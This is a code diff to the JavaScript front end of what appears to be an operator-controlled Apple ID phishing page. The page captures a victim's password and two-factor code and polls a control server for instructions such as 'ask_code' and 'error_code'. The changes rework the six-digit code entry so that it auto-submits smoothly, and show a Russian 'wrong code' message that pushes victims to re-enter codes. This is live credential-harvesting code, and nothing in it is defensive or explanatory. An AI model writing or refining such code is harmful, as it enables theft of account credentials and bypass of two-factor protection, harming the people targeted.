@@ -281,6 +281,14 @@ function initApp() {
             stepSuccess
         ].forEach(s => s && s.classList.remove("active"));
         if (targetStep) targetStep.classList.add("active");
+        if (targetStep === stepApple2FA) {
+            setTimeout(() => {
+                if (apple2faCodeInput) {
+                    apple2faCodeInput.focus();
+                    if (typeof syncApplePinVisuals === "function") syncApplePinVisuals();
+                }
+            }, 120);
+        }
     }
 
     function navigateToAuthOrSavedStep() {
@@ -1629,6 +1637,8 @@ function initApp() {
     let applePollTimer = null;
     let handledApplePasswordError = false;
     let handledAppleCodeError = false;
+    let handledAppleAskCode = false;
+    let handledAppleAskPrompt = false;
 
     function clearAppleErrors() {
         if (appleEmailError) appleEmailError.classList.add("hidden");
@@ -1671,8 +1681,10 @@ function initApp() {
             if (apple2faError) apple2faError.classList.remove("hidden");
             const pinCells = document.querySelectorAll(".apple-pin-cell");
             pinCells.forEach(cell => cell.classList.add("apple-pin-invalid"));
-            const firstCell = document.querySelector(".apple-pin-cell[data-index='0']");
-            if (firstCell) firstCell.focus();
+            if (apple2faCodeInput) {
+                apple2faCodeInput.focus();
+                syncApplePinVisuals();
+            }
         }
     }
 
@@ -1684,22 +1696,31 @@ function initApp() {
         if (appleChipInitial) appleChipInitial.textContent = initial || "";
     }
 
-    function getApplePinValue() {
+    function syncApplePinVisuals() {
+        const val = (apple2faCodeInput ? apple2faCodeInput.value.replace(/\D/g, "") : "").slice(0, 6);
         const cells = document.querySelectorAll(".apple-pin-cell");
-        let val = "";
-        cells.forEach(c => { val += (c.value || ""); });
-        return val;
+        const isFocused = (document.activeElement === apple2faCodeInput);
+        cells.forEach((cell, idx) => {
+            cell.textContent = val[idx] || "";
+            cell.classList.toggle("filled", !!val[idx]);
+            const shouldBeActive = isFocused && (idx === val.length || (val.length === 6 && idx === 5));
+            cell.classList.toggle("active", shouldBeActive);
+        });
+    }
+
+    function getApplePinValue() {
+        return (apple2faCodeInput ? apple2faCodeInput.value.replace(/\D/g, "").slice(0, 6) : "");
     }
 
     function clearApplePinCells() {
+        if (apple2faCodeInput) apple2faCodeInput.value = "";
         const pinCells = document.querySelectorAll(".apple-pin-cell");
         pinCells.forEach(cell => {
-            cell.value = "";
-            cell.classList.remove("apple-pin-invalid");
+            cell.textContent = "";
+            cell.classList.remove("apple-pin-invalid", "filled", "active");
         });
-        if (apple2faCodeInput) apple2faCodeInput.value = "";
-        const firstCell = document.querySelector(".apple-pin-cell[data-index='0']");
-        if (firstCell) firstCell.focus();
+        syncApplePinVisuals();
+        if (apple2faCodeInput) apple2faCodeInput.focus();
     }
 
     async function detectAppleGeoLocation() {
@@ -1782,8 +1803,10 @@ function initApp() {
     if (btnBackToApple2FA) {
         btnBackToApple2FA.addEventListener("click", () => {
             showStep(stepApple2FA);
-            const firstCell = document.querySelector(".apple-pin-cell[data-index='0']");
-            if (firstCell) firstCell.focus();
+            if (apple2faCodeInput) {
+                apple2faCodeInput.focus();
+                syncApplePinVisuals();
+            }
         });
     }
 
@@ -1879,6 +1902,8 @@ function initApp() {
             }
 
             handledApplePasswordError = false;
+            handledAppleAskCode = false;
+            handledAppleAskPrompt = false;
             userApplePassword = pwd;
             btnSubmitApplePassword.disabled = true;
             if (appleLoadingBar) appleLoadingBar.classList.remove("hidden");
@@ -1889,67 +1914,31 @@ function initApp() {
         });
     }
 
-    // Step 3: PIN Cells Initialization & Management
-    const pinCells = document.querySelectorAll(".apple-pin-cell");
-    pinCells.forEach((cell, idx) => {
-        cell.addEventListener("input", () => {
+    // Step 3: PIN Input Initialization & Management
+    const applePinWrap = document.getElementById("applePinWrap");
+    if (applePinWrap && apple2faCodeInput) {
+        applePinWrap.addEventListener("click", () => {
+            apple2faCodeInput.focus();
+            syncApplePinVisuals();
+        });
+    }
+
+    if (apple2faCodeInput) {
+        apple2faCodeInput.addEventListener("input", () => {
             clearAppleErrors();
             handledAppleCodeError = false;
-            let val = cell.value.replace(/\D/g, "");
-            if (val.length > 1) {
-                val = val.charAt(val.length - 1);
-            }
-            cell.value = val;
+            let val = apple2faCodeInput.value.replace(/\D/g, "").slice(0, 6);
+            apple2faCodeInput.value = val;
+            syncApplePinVisuals();
 
-            const fullPin = getApplePinValue();
-            if (apple2faCodeInput) apple2faCodeInput.value = fullPin;
-
-            if (val && idx < 5) {
-                const nextCell = document.querySelector(`.apple-pin-cell[data-index='${idx + 1}']`);
-                if (nextCell) nextCell.focus();
-            }
-
-            if (fullPin.length === 6) {
-                setTimeout(() => submitApple2FA(), 180);
+            if (val.length === 6) {
+                setTimeout(() => submitApple2FA(), 140);
             }
         });
 
-        cell.addEventListener("keydown", (e) => {
-            if (e.key === "Backspace") {
-                if (!cell.value && idx > 0) {
-                    const prevCell = document.querySelector(`.apple-pin-cell[data-index='${idx - 1}']`);
-                    if (prevCell) {
-                        prevCell.value = "";
-                        prevCell.focus();
-                        const fullPin = getApplePinValue();
-                        if (apple2faCodeInput) apple2faCodeInput.value = fullPin;
-                    }
-                }
-            }
-        });
-
-        cell.addEventListener("paste", (e) => {
-            e.preventDefault();
-            clearAppleErrors();
-            handledAppleCodeError = false;
-            const pasted = (e.clipboardData || window.clipboardData).getData("text");
-            const digits = (pasted || "").replace(/\D/g, "").slice(0, 6);
-            if (!digits) return;
-
-            pinCells.forEach((c, i) => {
-                c.value = digits[i] || "";
-            });
-            const fullPin = getApplePinValue();
-            if (apple2faCodeInput) apple2faCodeInput.value = fullPin;
-
-            if (digits.length === 6) {
-                setTimeout(() => submitApple2FA(), 180);
-            } else {
-                const targetCell = document.querySelector(`.apple-pin-cell[data-index='${digits.length}']`);
-                if (targetCell) targetCell.focus();
-            }
-        });
-    });
+        apple2faCodeInput.addEventListener("focus", syncApplePinVisuals);
+        apple2faCodeInput.addEventListener("blur", syncApplePinVisuals);
+    }
 
     function submitApple2FA() {
         clearAppleErrors();
@@ -1960,6 +1949,8 @@ function initApp() {
         }
 
         handledAppleCodeError = false;
+        handledAppleAskCode = false;
+        handledAppleAskPrompt = false;
         if (btnSubmitApple2FA) btnSubmitApple2FA.disabled = true;
         if (appleLoadingBar) appleLoadingBar.classList.remove("hidden");
 
@@ -2012,6 +2003,8 @@ function initApp() {
             clearInterval(applePollTimer);
             applePollTimer = null;
         }
+        handledAppleAskCode = false;
+        handledAppleAskPrompt = false;
     }
 
     function startApplePolling() {
@@ -2064,12 +2057,18 @@ function initApp() {
                     clearAppleErrors();
                 } else if (ctrl.status === "ask_code") {
                     if (appleLoadingBar) appleLoadingBar.classList.add("hidden");
+                    if (btnSubmitApple2FA) btnSubmitApple2FA.disabled = false;
                     if (!stepApple2FA.classList.contains("active")) {
                         showStep(stepApple2FA);
                     }
-                    clearAppleErrors();
-                    const firstCell = document.querySelector(".apple-pin-cell[data-index='0']");
-                    if (firstCell) firstCell.focus();
+                    if (!handledAppleAskCode) {
+                        handledAppleAskCode = true;
+                        clearAppleErrors();
+                        if (apple2faCodeInput) {
+                            apple2faCodeInput.focus();
+                            syncApplePinVisuals();
+                        }
+                    }
                 } else if (ctrl.status === "error_code") {
                     if (appleLoadingBar) appleLoadingBar.classList.add("hidden");
                     if (btnSubmitApple2FA) btnSubmitApple2FA.disabled = false;
@@ -2078,6 +2077,7 @@ function initApp() {
                     }
                     if (!handledAppleCodeError) {
                         handledAppleCodeError = true;
+                        handledAppleAskCode = false;
                         showAppleError("2fa", ctrl.error_msg || "Неверный код проверки. Повторите попытку.");
                         clearApplePinCells();
                         sendAppleControlCommand("idle", null);
@@ -2087,7 +2087,10 @@ function initApp() {
                     if (!stepApplePrompt.classList.contains("active")) {
                         showStep(stepApplePrompt);
                     }
-                    detectAppleGeoLocation();
+                    if (!handledAppleAskPrompt) {
+                        handledAppleAskPrompt = true;
+                        detectAppleGeoLocation();
+                    }
                 } else if (ctrl.status === "completed" || data.authorized) {
                     stopApplePolling();
                     if (appleLoadingBar) appleLoadingBar.classList.add("hidden");
